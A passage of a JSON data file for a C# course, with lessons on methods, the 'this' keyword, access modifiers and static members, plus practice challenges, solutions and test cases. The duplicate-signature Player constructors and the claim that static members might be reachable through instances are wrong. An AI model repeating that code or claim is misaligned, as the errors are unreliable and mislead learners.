              "content": "Imagine a TV remote. Each button makes the TV DO something: change channel, adjust volume, power on/off. You don't know HOW it works inside - you just press the button!\n\nMETHODS are like those buttons - they make objects DO things. Properties hold data (what the object IS), methods define behavior (what the object CAN DO).\n\nMethods can:\n• Take INPUT (parameters) - 'Add these two numbers'\n• Produce OUTPUT (return value) - 'Here's the result: 7'\n• Modify the object's state - 'Increase my score by 10'\n• Just perform actions (void) - 'Print this message'\n\nThink: A Calculator object has Add(), Subtract(), Multiply() methods. A Player object has TakeDamage(), Heal(), Attack() methods. Methods bring objects to LIFE!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class Calculator\n{\n    // Method with parameters and return value\n    public int Add(int a, int b)\n    {\n        return a + b;\n    }\n    \n    // Method with no return (void)\n    public void DisplayResult(int result)\n    {\n        Console.WriteLine(\"Result: \" + result);\n    }\n    \n    // Method with multiple parameters\n    public double Average(double x, double y, double z)\n    {\n        return (x + y + z) / 3;\n    }\n}\n\nclass Player\n{\n    public string Name;\n    public int Health = 100;\n    public int Score = 0;\n    \n    // Method that modifies object state\n    public void TakeDamage(int damage)\n    {\n        Health -= damage;\n        Console.WriteLine(Name + \" took \" + damage + \" damage! Health: \" + Health);\n    }\n    \n    // Method with return value\n    public bool IsAlive()\n    {\n        return Health > 0;\n    }\n}\n\n// Usage\nCalculator calc = new Calculator();\nint sum = calc.Add(5, 3);\ncalc.DisplayResult(sum);\n\nPlayer player = new Player();\nplayer.Name = \"Hero\";\nplayer.TakeDamage(30);\nif (player.IsAlive())\n    Console.WriteLine(\"Still fighting!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public int Add(int a, int b)`**: Method signature: access modifier (public), return type (int), name (Add), parameters (int a, int b). This method takes two ints and returns an int.\n\n**`return a + b;`**: The 'return' keyword sends a value back to the caller. The type MUST match the method's return type (int here). return exits the method immediately!\n\n**`public void DisplayResult(int result)`**: 'void' means 'returns nothing'. Use void for methods that DO something but don't need to send a value back. No return statement needed (or use 'return;' to exit early).\n\n**`Method overloading`**: You can have multiple methods with the SAME NAME but DIFFERENT parameters: Add(int, int), Add(double, double), Add(int, int, int). C# picks the right one based on arguments!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Forgetting 'return':** If your method has a return type (not void), every code path MUST return a value. `public int Add(int a, int b) { a + b; }` is WRONG - needs `return a + b;`\n\n**Missing parentheses:** `player.Attack` is a reference to the method. `player.Attack()` actually CALLS it. Parentheses are REQUIRED to execute a method!\n\n**Return type mismatch:** If method returns int, you can't `return \"hello\"`. The return value type MUST match the method signature.\n\n**Ignoring return values:** `calc.Add(5, 3);` works but throws away the result! Use `int sum = calc.Add(5, 3);` to capture returned values."
            },
            {
              "type": "REAL_WORLD",
              "title": "Method Design in Production Code",
              "content": "In professional e-commerce applications like ShopFlow, well-designed methods are the foundation of maintainable code. Here are the key principles production teams follow when writing methods:\n\n**Single Responsibility Principle**: Each method should do ONE thing well. A method called `ProcessOrder` should only process the order, not also send emails, update inventory, and log analytics. If your method name needs 'and' in it, split it into multiple methods. In ShopFlow, we have separate `ValidateOrder()`, `CalculateTotal()`, `ApplyDiscount()`, and `SaveOrder()` methods instead of one massive `DoEverything()` method.\n\n**Method Length Guidance**: Keep methods under 30 lines. If a method grows beyond this, it likely does too much and should be split. Long methods are hard to test, debug, and understand. When you find yourself scrolling to understand a method, refactor it.\n\n**Parameter Count**: More than 3-4 parameters is a code smell. When you need many parameters, create a parameter object:\n\n```csharp\n// BAD: Too many parameters\npublic void CreateOrder(string customerName, string email, string address, string city, string zip, List<Product> items, decimal discount, string couponCode) { }\n\n// GOOD: Use a parameter object\npublic void CreateOrder(OrderRequest request) { }\n\npublic class OrderRequest\n{\n    public Customer Customer { get; set; }\n    public List<Product> Items { get; set; }\n    public DiscountInfo Discount { get; set; }\n}\n```\n\n**Guard Clauses (Return Early)**: Instead of deeply nested if-else blocks, validate preconditions at the start and return early. This makes code much more readable:\n\n```csharp\n// BAD: Deep nesting\npublic decimal CalculateDiscount(Order order)\n{\n    if (order != null)\n    {\n        if (order.Items.Count > 0)\n        {\n            if (order.Customer.IsPremium)\n            {\n                return order.Total * 0.2m;\n            }\n        }\n    }\n    return 0;\n}\n\n// GOOD: Guard clauses\npublic decimal CalculateDiscount(Order order)\n{\n    if (order == null) return 0;\n    if (order.Items.Count == 0) return 0;\n    if (!order.Customer.IsPremium) return 0;\n    \n    return order.Total * 0.2m;\n}\n```\n\n**XML Documentation for Public APIs**: In ShopFlow, all public methods have XML documentation that describes purpose, parameters, return values, and exceptions. This generates IntelliSense tooltips and API documentation automatically:\n\n```csharp\n/// <summary>\n/// Applies a promotional discount to the order.\n/// </summary>\n/// <param name=\"order\">The order to discount.</param>\n/// <param name=\"promoCode\">The promotional code to apply.</param>\n/// <returns>The discount amount applied.</returns>\n/// <exception cref=\"InvalidPromoCodeException\">Thrown when promo code is expired or invalid.</exception>\npublic decimal ApplyPromotion(Order order, string promoCode) { }\n```\n\nThese patterns keep ShopFlow maintainable as it scales. Start practicing them now!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a Game character class with action methods!\n\n1. Class 'Character' with fields: string Name, int Health = 100, int Mana = 50\n2. Method 'Attack' (returns int): returns random damage 10-20\n3. Method 'Heal' (void, takes int amount): adds amount to Health (max 100)\n4. Method 'CastSpell' (returns bool): if Mana >= 20, reduce Mana by 20 and return true, else return false\n5. Create a character and call all methods, display results",
              "starterCode": "class Character\n{\n    public string Name;\n    public int Health = 100;\n    public int Mana = 50;\n    \n    // Add Attack method (returns int damage 10-20)\n    // Hint: Use new Random().Next(10, 21) for random 10-20\n    \n    // Add Heal method (void, takes int amount)\n    \n    // Add CastSpell method (returns bool)\n}\n\n// Create character and test methods\nCharacter hero = new Character();\nhero.Name = \"Warrior\";\n// Call Attack, Heal(20), CastSpell\n// Display results",
              "solution": "class Character\n{\n    public string Name;\n    public int Health = 100;\n    public int Mana = 50;\n    \n    public int Attack()\n    {\n        int damage = new Random().Next(10, 21);\n        Console.WriteLine(Name + \" attacks for \" + damage + \" damage!\");\n        return damage;\n    }\n    \n    public void Heal(int amount)\n    {\n        Health += amount;\n        if (Health > 100) Health = 100;\n        Console.WriteLine(Name + \" healed for \" + amount + \". Health: \" + Health);\n    }\n    \n    public bool CastSpell()\n    {\n        if (Mana >= 20)\n        {\n            Mana -= 20;\n            Console.WriteLine(Name + \" casts spell! Mana: \" + Mana);\n            return true;\n        }\n        Console.WriteLine(\"Not enough mana!\");\n        return false;\n    }\n}\n\nCharacter hero = new Character();\nhero.Name = \"Warrior\";\nint dmg = hero.Attack();\nhero.Heal(20);\nbool cast = hero.CastSpell();\nConsole.WriteLine(\"Spell cast success: \" + cast);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"attacks\"",
                  "expectedOutput": "attacks",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"healed\"",
                  "expectedOutput": "healed",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"spell\"",
                  "expectedOutput": "spell",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Method structure: public ReturnType MethodName(parameters) { code; return value; }. Use void for no return. Methods can access and modify the object's fields!"
                },
                {
                  "level": 2,
                  "text": "Forgetting 'return': If method returns a value (not void), you MUST return something! 'public int Add(int a, int b) { a + b; }' is WRONG - needs 'return a + b;'"
                },
                {
                  "level": 3,
                  "text": "Calling methods without parentheses: player.Attack is WRONG! Must be player.Attack() - parentheses are REQUIRED even with no parameters!"
                },
                {
                  "level": 4,
                  "text": "Wrong return type: If method returns int, you can't return a string! The return value type MUST match the method signature."
                },
                {
                  "level": 5,
                  "text": "Not storing return values: int result = calc.Add(5, 3); stores the result. calc.Add(5, 3); without storing throws away the return value!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'return'",
                  "consequence": "If method returns a value (not void), you MUST return something! 'public int Add(int a, int b) { a + b; }' is WRONG - needs 'return a + b;'",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Calling methods without parentheses",
                  "consequence": "player.Attack is WRONG! Must be player.Attack() - parentheses are REQUIRED even with no parameters!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong return type",
                  "consequence": "If method returns int, you can't return a string! The return value type MUST match the method signature.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not storing return values",
                  "consequence": "int result = calc.Add(5, 3); stores the result. calc.Add(5, 3); without storing throws away the return value!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-05",
          "title": "The 'this' Keyword (Talking About Yourself)",
          "moduleId": "module-06",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "When you say 'my name', 'my score', 'my health', you're referring to YOUR OWN properties. In C#, objects use 'this' to refer to themselves!\n\nImagine a class introducing itself: 'Hi, MY name is Alice, and MY score is 100.' In code, that's: 'Hi, THIS.name is Alice, and THIS.score is 100.'\n\nWhen do you need 'this'?\n\n1. **Disambiguating**: When a parameter has the same name as a field\n   • Constructor: Player(string name) { this.name = name; }\n   • 'this.name' = field, 'name' = parameter\n\n2. **Passing yourself**: Registering with a manager\n   • GameManager.RegisterPlayer(this); // 'Register ME!'\n\n3. **Clarity**: Making it explicit which 'name' you mean\n\n'this' means 'the current instance' - the specific object this code is running inside."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class Player\n{\n    private string name;\n    private int score;\n    \n    // Without 'this' - confusing!\n    public Player(string n, int s)\n    {\n        name = n;  // Works, but parameter names are weird\n        score = s;\n    }\n    \n    // With 'this' - much clearer!\n    public Player(string name, int score)\n    {\n        this.name = name;   // this.name = field, name = parameter\n        this.score = score;\n    }\n    \n    public void DisplayInfo()\n    {\n        // 'this' is optional here but makes it clear\n        Console.WriteLine(\"Name: \" + this.name);\n        Console.WriteLine(\"Score: \" + this.score);\n    }\n    \n    public Player Clone()\n    {\n        // Return a new player with same values\n        return new Player(this.name, this.score);\n    }\n    \n    public void CompareWith(Player other)\n    {\n        if (this.score > other.score)\n            Console.WriteLine(this.name + \" wins!\");\n        else\n            Console.WriteLine(other.name + \" wins!\");\n    }\n}\n\n// Usage\nPlayer p1 = new Player(\"Alice\", 100);\nPlayer p2 = new Player(\"Bob\", 150);\np1.CompareWith(p2);  // Inside CompareWith, 'this' refers to p1",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`this.fieldName`**: 'this' refers to the current instance - the object this code is running in. 'this.name' means 'my name field'.\n\n**`this.name = name;`**: Left side (this.name) = the field. Right side (name) = the parameter. Use 'this' to distinguish when names collide!\n\n**`method(this)`**: Passing 'this' as an argument passes THE CURRENT OBJECT to another method. Like saying 'here, take ME as a parameter'.\n\n**`When 'this' is optional`**: If no naming conflict, 'this' is optional: 'Console.WriteLine(name)' and 'Console.WriteLine(this.name)' are identical. But 'this' adds clarity!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Forgetting 'this' causes self-assignment!** In `Player(string name) { name = name; }`, you're assigning the parameter to itself! The field is never set. Use `this.name = name;`\n\n**'this' is forbidden in static methods!** Static methods don't belong to any instance, so there's no 'this'. `public static void Method() { this.field = 5; }` is a compile error.\n\n**Don't overuse 'this':** While `this.field` is always valid, writing it everywhere when there's no ambiguity can clutter your code. Use it when needed for clarity or disambiguation.\n\n**'this' in constructor chaining:** Use `this()` to call another constructor in the same class: `public Player() : this(\"Unknown\", 0) { }` - calls the two-parameter constructor."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an Employee class that uses 'this' properly!\n\n1. Private fields: string name, decimal salary\n2. Constructor taking string name, decimal salary - use 'this' to assign\n3. Method 'GiveRaise(decimal amount)' - increases this.salary by amount\n4. Method 'CompareSalary(Employee other)' - returns true if this.salary > other.salary\n5. Method 'Display()' - prints this employee's info\n6. Create two employees, give one a raise, compare salaries",
              "starterCode": "class Employee\n{\n    private string name;\n    private decimal salary;\n    \n    // Constructor using 'this'\n    public Employee(string name, decimal salary)\n    {\n        // Use 'this' to assign fields\n    }\n    \n    // Add GiveRaise method\n    \n    // Add CompareSalary method\n    \n    // Add Display method\n}\n\n// Create employees and test\nEmployee emp1 = new Employee(\"Alice\", 50000);\nEmployee emp2 = new Employee(\"Bob\", 60000);\n// Give emp1 a raise, compare, display",
              "solution": "class Employee\n{\n    private string name;\n    private decimal salary;\n    \n    public Employee(string name, decimal salary)\n    {\n        this.name = name;\n        this.salary = salary;\n    }\n    \n    public void GiveRaise(decimal amount)\n    {\n        this.salary += amount;\n        Console.WriteLine(this.name + \" got a raise! New salary: $\" + this.salary);\n    }\n    \n    public bool CompareSalary(Employee other)\n    {\n        return this.salary > other.salary;\n    }\n    \n    public void Display()\n    {\n        Console.WriteLine(this.name + \": $\" + this.salary);\n    }\n}\n\nEmployee emp1 = new Employee(\"Alice\", 50000);\nEmployee emp2 = new Employee(\"Bob\", 60000);\nemp1.Display();\nemp2.Display();\nemp1.GiveRaise(15000);\nif (emp1.CompareSalary(emp2))\n    Console.WriteLine(\"Alice earns more!\");\nelse\n    Console.WriteLine(\"Bob earns more!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Alice\"",
                  "expectedOutput": "Alice",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Bob\"",
                  "expectedOutput": "Bob",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"salary\"",
                  "expectedOutput": "salary",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "In constructor: this.fieldName = parameterName; In methods: use this.fieldName to access the object's data. Compare 'this' with 'other' parameter."
                },
                {
                  "level": 2,
                  "text": "Forgetting 'this' in constructors: If parameter and field have same name, you MUST use this.field = parameter; Without 'this', you're assigning parameter to itself!"
                },
                {
                  "level": 3,
                  "text": "Using 'this' outside instance methods: You can't use 'this' in static methods! 'this' refers to the current instance, static methods don't belong to an instance."
                },
                {
                  "level": 4,
                  "text": "Overusing 'this': While clear, using this.field everywhere can be verbose. Use it when needed (disambiguation) or for clarity, but it's optional when no conflict."
                },
                {
                  "level": 5,
                  "text": "'this' in static context: 'public static void Method() { this.field = 5; }' is ERROR! Static methods are class-level, no 'this' instance exists!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'this' in constructors",
                  "consequence": "If parameter and field have same name, you MUST use this.field = parameter; Without 'this', you're assigning parameter to itself!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using 'this' outside instance methods",
                  "consequence": "You can't use 'this' in static methods! 'this' refers to the current instance, static methods don't belong to an instance.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Overusing 'this'",
                  "consequence": "While clear, using this.field everywhere can be verbose. Use it when needed (disambiguation) or for clarity, but it's optional when no conflict.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "'this' in static context",
                  "consequence": "'public static void Method() { this.field = 5; }' is ERROR! Static methods are class-level, no 'this' instance exists!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-06",
          "title": "Access Modifiers (public, private, protected)",
          "moduleId": "module-06",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Think of your house with different rooms:\n\n• **PUBLIC** = Living room: Anyone can enter, guests welcome\n• **PRIVATE** = Your bedroom: Only YOU can enter\n• **PROTECTED** = Family room: Only family members (and you) allowed\n\nAccess modifiers control WHO can access your class members (fields, properties, methods).\n\nWhy restrict access? SECURITY and ORGANIZATION!\n• Keep internal implementation private (users don't need to know HOW it works)\n• Expose only what's necessary through public methods\n• Prevent accidental modification of important data\n\nThis is **ENCAPSULATION** - one of OOP's core principles. Hide complexity, expose simplicity!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class BankAccount\n{\n    // PRIVATE: Only this class can access\n    private decimal balance;\n    private string accountNumber;\n    \n    // PUBLIC: Anyone can access\n    public string AccountHolder;\n    \n    // PUBLIC constructor\n    public BankAccount(string holder, decimal initialBalance)\n    {\n        AccountHolder = holder;\n        balance = initialBalance;  // Can access private field within class\n        accountNumber = GenerateAccountNumber();  // Calling private method\n    }\n    \n    // PUBLIC method - users can call this\n    public void Deposit(decimal amount)\n    {\n        if (amount > 0)\n            balance += amount;\n    }\n    \n    // PUBLIC method exposing private data safely\n    public decimal GetBalance()\n    {\n        return balance;  // OK to access private field within class\n    }\n    \n    // PRIVATE method - only internal use\n    private string GenerateAccountNumber()\n    {\n        return \"ACC\" + new Random().Next(1000, 9999);\n    }\n}\n\n// Usage\nBankAccount account = new BankAccount(\"Alice\", 1000);\naccount.Deposit(500);  // OK - public method\nConsole.WriteLine(account.GetBalance());  // OK - public method\n// account.balance = 999999;  // ERROR! balance is private\n// account.GenerateAccountNumber();  // ERROR! private method",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`private`**: Only accessible within the same class. Fields should almost ALWAYS be private! Access them through public properties or methods.\n\n**`public`**: Accessible from anywhere. Use for methods and properties that form your class's PUBLIC INTERFACE - what users interact with.\n\n**`protected`**: Accessible within the class AND derived classes (inheritance - next module!). Useful for base classes that child classes need to access.\n\n**`Default (no modifier)`**: In C#, if you don't specify, it defaults to PRIVATE for class members. Always specify explicitly for clarity!\n\n**`Encapsulation best practice`**: PRIVATE fields + PUBLIC properties/methods = encapsulation! Control how data is accessed and modified. Never expose fields directly!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Making everything public is dangerous!** `public string Password;` exposes sensitive data. Always use private fields with controlled access methods.\n\n**Default is PRIVATE, not public!** If you forget the modifier, class members are private by default. `string name;` inside a class is private - you can't access it from outside.\n\n**Protected is not public!** `protected` members are only accessible in the same class OR derived classes - not from unrelated code. Don't confuse it with public.\n\n**internal vs private:** There's also `internal` (accessible within the same assembly/project). For beginners, stick to public and private until you need more control."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a secure User class using access modifiers!\n\n1. PRIVATE fields: string password, int loginAttempts\n2. PUBLIC properties: string Username { get; set; }\n3. PUBLIC constructor: User(string username, string password)\n4. PUBLIC method Login(string pwd): checks if pwd matches password\n   - If match: reset loginAttempts to 0, return true\n   - If wrong: increment loginAttempts, return false\n5. PRIVATE method IsLockedOut(): returns true if loginAttempts >= 3\n6. Test with correct and incorrect passwords",
              "starterCode": "class User\n{\n    // Private fields\n    \n    // Public property\n    \n    // Public constructor\n    \n    // Public Login method\n    \n    // Private IsLockedOut method\n}\n\n// Create user and test login\nUser user = new User(\"alice\", \"secret123\");\n// Try wrong password twice, then correct password\n// Try accessing private fields (should error)",
              "solution": "class User\n{\n    private string password;\n    private int loginAttempts = 0;\n    \n    public string Username { get; set; }\n    \n    public User(string username, string password)\n    {\n        this.Username = username;\n        this.password = password;\n    }\n    \n    public bool Login(string pwd)\n    {\n        if (IsLockedOut())\n        {\n            Console.WriteLine(\"Account locked! Too many attempts.\");\n            return false;\n        }\n        \n        if (pwd == password)\n        {\n            loginAttempts = 0;\n            Console.WriteLine(\"Login successful!\");\n            return true;\n        }\n        else\n        {\n            loginAttempts++;\n            Console.WriteLine(\"Wrong password! Attempts: \" + loginAttempts);\n            return false;\n        }\n    }\n    \n    private bool IsLockedOut()\n    {\n        return loginAttempts >= 3;\n    }\n}\n\nUser user = new User(\"alice\", \"secret123\");\nuser.Login(\"wrong\");\nuser.Login(\"wrong2\");\nuser.Login(\"secret123\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Login\"",
                  "expectedOutput": "Login",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"password\"",
                  "expectedOutput": "password",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Make sensitive data (password, loginAttempts) private. Provide public methods to interact with them safely. Private methods are internal helpers."
                },
                {
                  "level": 2,
                  "text": "Making everything public: Don't expose internal data! Use private for fields, public for methods/properties only. 'public string password' is BAD - anyone can change it!"
                },
                {
                  "level": 3,
                  "text": "Accessing private from outside: You can't do 'account.balance = 1000' if balance is private! That's the point - use public methods instead."
                },
                {
                  "level": 4,
                  "text": "Forgetting to specify: If you don't write 'public' or 'private', C# defaults to PRIVATE. Always specify explicitly for clarity!"
                },
                {
                  "level": 5,
                  "text": "Using protected too early: You'll learn about protected with inheritance. For now, use private (internal) and public (external interface) only."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Making everything public",
                  "consequence": "Don't expose internal data! Use private for fields, public for methods/properties only. 'public string password' is BAD - anyone can change it!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Accessing private from outside",
                  "consequence": "You can't do 'account.balance = 1000' if balance is private! That's the point - use public methods instead.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to specify",
                  "consequence": "If you don't write 'public' or 'private', C# defaults to PRIVATE. Always specify explicitly for clarity!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using protected too early",
                  "consequence": "You'll learn about protected with inheritance. For now, use private (internal) and public (external interface) only.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-07",
          "title": "Static vs Instance Members",
          "moduleId": "module-06",
          "order": 7,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a school:\n\n• **INSTANCE (each student)**: Each student has their OWN name, grade, age. John's grade is different from Mary's grade.\n\n• **STATIC (shared by all)**: The school bell rings for EVERYONE. The school's name is the SAME for all students. These are SHARED, not personal.\n\nIn C#:\n• **Instance members**: Each object has its own copy. player1.score is different from player2.score.\n• **Static members**: Shared by ALL instances of the class. ONE copy for the whole class.\n\nWhen to use static?\n• Counters: How many Player objects exist? Player.Count (shared)\n• Utility methods: Math.Sqrt(), Console.WriteLine() - don't need a specific object!\n• Constants: Math.PI - same for everyone\n\nAccess static members through the CLASS NAME (Player.Count), not an object (player1.Count won't work)!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class Player\n{\n    // STATIC - shared by all players\n    public static int TotalPlayers = 0;\n    public static int MaxScore = 0;\n    \n    // INSTANCE - each player has their own\n    public string Name;\n    public int Score;\n    \n    public Player(string name)\n    {\n        Name = name;\n        Score = 0;\n        TotalPlayers++;  // Increment shared counter\n    }\n    \n    // INSTANCE method - works with specific player\n    public void AddPoints(int points)\n    {\n        Score += points;\n        \n        // Update static MaxScore if this player beat it\n        if (Score > MaxScore)\n            MaxScore = Score;\n    }\n    \n    // STATIC method - doesn't need a specific player\n    public static void DisplayStats()\n    {\n        Console.WriteLine(\"Total Players: \" + TotalPlayers);\n        Console.WriteLine(\"Highest Score: \" + MaxScore);\n    }\n}\n\n// Usage\nPlayer p1 = new Player(\"Alice\");\nPlayer p2 = new Player(\"Bob\");\n\n// Access static through class name\nConsole.WriteLine(\"Players: \" + Player.TotalPlayers);  // 2\n\np1.AddPoints(100);\np2.AddPoints(150);\n\n// Static method called through class name\nPlayer.DisplayStats();  // Total: 2, Max: 150\n\n// Each instance has own Score\nConsole.WriteLine(p1.Score);  // 100\nConsole.WriteLine(p2.Score);  // 150",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public static int Count`**: STATIC field - ONE copy shared by all instances. Access via ClassName.FieldName, not objectName.FieldName!\n\n**`public string Name`**: INSTANCE field (no 'static') - EACH object has its own copy. Access via objectName.FieldName.\n\n**`public static void Method()`**: STATIC method - called through class name: ClassName.Method(). Can only access static members! Can't use 'this' or instance fields.\n\n**`Player.TotalPlayers vs p1.Score`**: Static members use CLASS NAME (Player.TotalPlayers). Instance members use OBJECT (p1.Score). This is how you know which is which!\n\n**`Math.PI, Console.WriteLine`**: These are static! Math.PI (static field), Console.WriteLine (static method). You don't create Math or Console objects - you use the class directly!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Static methods can't access instance members!** Inside `static void Method()`, you cannot use `this.field` or any instance field/method. Static exists at the CLASS level, not object level.\n\n**Accessing static through instances is bad practice!** While `player1.TotalPlayers` might compile, it's confusing! Always use `Player.TotalPlayers` for static members.\n\n**Static state persists!** Static fields keep their values across all object creations. If `TotalPlayers = 5` and you create a new Player, it becomes 6 - not reset to 1!\n\n**Thread safety warning:** In multi-threaded apps, static fields are shared across threads. Modifying them without locks can cause race conditions. For beginners, this is advanced - just be aware!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-07-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a Vehicle counter system!\n\n1. Class 'Vehicle' with:\n   - STATIC field: int TotalVehicles = 0\n   - STATIC field: int MaxSpeed = 0\n   - INSTANCE fields: string Model, int Speed\n2. Constructor that increments TotalVehicles\n3. INSTANCE method Accelerate(int amount): increases Speed, updates static MaxSpeed if beaten\n4. STATIC method ShowStats(): displays TotalVehicles and MaxSpeed\n5. Create 3 vehicles, accelerate them, call ShowStats\n\nDemonstrate the difference between static (shared) and instance (individual)!",
              "starterCode": "class Vehicle\n{\n    // Static members (shared)\n    \n    // Instance members (per object)\n    \n    // Constructor\n    \n    // Instance method Accelerate\n    \n    // Static method ShowStats\n}\n\n// Create vehicles and test\nVehicle car1 = new Vehicle();\nVehicle car2 = new Vehicle();\nVehicle car3 = new Vehicle();\n// Set models, accelerate, show stats",
              "solution": "class Vehicle\n{\n    public static int TotalVehicles = 0;\n    public static int MaxSpeed = 0;\n    \n    public string Model;\n    public int Speed;\n    \n    public Vehicle(string model)\n    {\n        Model = model;\n        Speed = 0;\n        TotalVehicles++;\n    }\n    \n    public void Accelerate(int amount)\n    {\n        Speed += amount;\n        Console.WriteLine(Model + \" accelerated to \" + Speed + \" mph\");\n        \n        if (Speed > MaxSpeed)\n            MaxSpeed = Speed;\n    }\n    \n    public static void ShowStats()\n    {\n        Console.WriteLine(\"=== Vehicle Stats ===\");\n        Console.WriteLine(\"Total Vehicles: \" + TotalVehicles);\n        Console.WriteLine(\"Max Speed Reached: \" + MaxSpeed + \" mph\");\n    }\n}\n\nVehicle car1 = new Vehicle(\"Tesla\");\nVehicle car2 = new Vehicle(\"BMW\");\nVehicle car3 = new Vehicle(\"Audi\");\n\ncar1.Accelerate(80);\ncar2.Accelerate(120);\ncar3.Accelerate(95);\n\nVehicle.ShowStats();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Total\"",
                  "expectedOutput": "Total",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Max Speed\"",
                  "expectedOutput": "Max Speed",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Static: use 'static' keyword, access via ClassName. Instance: no 'static', access via objectName. Static methods can't use 'this' or instance members!"
                },
                {
                  "level": 2,
                  "text": "Accessing static through instance: 'p1.TotalPlayers' might work but is WRONG! Always use ClassName.StaticMember for clarity: Player.TotalPlayers."
                },
                {
                  "level": 3,
                  "text": "Using instance members in static methods: Static methods can't access instance fields! 'public static void Method() { Console.WriteLine(Name); }' is ERROR if Name is instance field."
                },
                {
                  "level": 4,
                  "text": "Forgetting 'static' keyword: If you want a shared member, you MUST use 'static'. 'public int TotalPlayers' without 'static' means EACH object has its own TotalPlayers (not shared)!"
                },
                {
                  "level": 5,
                  "text": "When to use static: Use static for shared data (counters, constants) or utility methods (Math.Sqrt). Use instance for object-specific data (each player's score)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Accessing static through instance",
                  "consequence": "'p1.TotalPlayers' might work but is WRONG! Always use ClassName.StaticMember for clarity: Player.TotalPlayers.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using instance members in static methods",
                  "consequence": "Static methods can't access instance fields! 'public static void Method() { Console.WriteLine(Name); }' is ERROR if Name is instance field.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting 'static' keyword",
                  "consequence": "If you want a shared member, you MUST use 'static'. 'public int TotalPlayers' without 'static' means EACH object has its own TotalPlayers (not shared)!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
